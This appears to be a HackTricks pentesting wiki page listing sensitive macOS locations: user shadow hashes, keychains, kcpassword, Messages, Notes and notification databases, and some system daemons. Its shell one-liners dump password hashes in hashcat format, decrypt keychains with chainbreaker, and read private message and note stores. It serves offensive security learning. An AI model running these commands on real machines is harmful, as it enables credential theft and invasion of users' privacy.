# macOS Sensitive Locations & Interesting Daemons

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Passwords

### Shadow Passwords

Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
The following oneliner can be use to dump **all the information about the users** (including hash info):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.

An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

Another way to obtain the `ShadowHashData` of a user is by using `dscl`: ``sudo dscl . -read /Users/`whoami` ShadowHashData``

### /etc/master.passwd

This file is **only used** when the system id running in **single-user mode** (so not very frequently).

### Keychain Dump

Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
{% endhint %}

### Keychaindump Overview

A tool named **keychaindump** has been developed to extract passwords from macOS keychains, but it faces limitations on newer macOS versions like Big Sur, as indicated in a [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). The use of **keychaindump** requires the attacker to gain access and escalate privileges to **root**. The tool exploits the fact that the keychain is unlocked by default upon user login for convenience, allowing applications to access it without requiring the user's password repeatedly. However, if a user opts to lock their keychain after each use, **keychaindump** becomes ineffective.

**Keychaindump** operates by targeting a specific process called **securityd**, described by Apple as a daemon for authorization and cryptographic operations, crucial for accessing the keychain. The extraction process involves identifying a **Master Key** derived from the user's login password. This key is essential for reading the keychain file. To locate the **Master Key**, **keychaindump** scans the memory heap of **securityd** using the `vmmap` command, looking for potential keys within areas flagged as `MALLOC_TINY`. The following command is used to inspect these memory locations:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

After identifying potential master keys, **keychaindump** searches through the heaps for a specific pattern (`0x0000000000000018`) that indicates a candidate for the master key. Further steps, including deobfuscation, are required to utilize this key, as outlined in **keychaindump**'s source code. Analysts focusing on this area should note that the crucial data for decrypting the keychain is stored within the memory of the **securityd** process. An example command to run **keychaindump** is:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:

* Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
* Internet Passwords
* Generic Passwords
* Private Keys
* Public Keys
* X509 Certificates
* Secure Notes
* Appleshare Passwords

Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.

Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.

#### **Dump keychain keys**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) with SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) cracking the hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) with memory dump**

[Follow these steps](../#dumping-memory-with-osxpmem) to perform a **memory dump**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) using users password**

If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

You can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Most of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform** it to **human** **readable** or use **`strings`**. To access it you can do:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notes

The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Preferences

In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS the cli tool **`defaults`** can be used to **modify the Preferences file**.

**`/usr/sbin/cfprefsd`** claims the XPC services `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` and can be called to perform actions such as modify preferences.

## OpenDirectory permissions.plist

The file `/System/Library/OpenDirectory/permissions.plist` contains permissions applied on node attributes and is protected by SIP.\
This file grants permissions to specific users by UUID (and not uid) so they are able to access specific sensitive information like `ShadowHashData`, `HeimdalSRPKey` and `KerberosKeys` among others:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## System Notifications

### Darwin Notifications

The main daemon for notifications is **`/usr/sbin/notifyd`**. In order to receive notifications, clients must register through the `com.apple.system.notification_center` Mach port (check them with `sudo lsmp -p <pid notifyd>`). The daemon is configurable with the file `/etc/notify.conf`.

The names used for notifications are unique reverse DNS notations and when a notification is sent to one of them, the client(s) that have indicated that can handle it will receive it.

It's possible to dump the current status (and see all the names) sending the signal SIGUSR2 to the notifyd process and reading the generated file: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status 
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

The **Distributed Notification Center** whose main binary is **`/usr/sbin/distnoted`**, is another way to send notifications. It exposes some XPC services and it performs some check to try to verify clients.

### Apple Push Notifications (APN)

In this case, applications can register for **topics**. The client will generate a token contacting Apple's servers through **`apsd`**.\
Then, providers, will have also generated a token and will be able to connect with Apple's servers to send messages to the clients. These messages will be locally received by **`apsd`** which will relay the notification to the application waiting for it.

The preferences are located in `/Library/Preferences/com.apple.apsd.plist`.

There is a local database of messages located in macOS in `/Library/Application\ Support/ApplePushService/aps.db` and in iOS in `/var/mobile/Library/ApplePushService`. It has 3 tables: `incoming_messages`, `outgoing_messages` and `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

It's also possible to get information about the daemon and connections using:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## User Notifications

These are notifications that the user should see in the screen:

* **`CFUserNotification`**: These API provides a way to show in the screen a pop-up with a message.
* **The Bulletin Board**: This shows in iOS a banner that disappears and will be stored in the Notification Center.
* **`NSUserNotificationCenter`**: This is the iOS bulletin board in MacOS. The database with the notifications in located in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

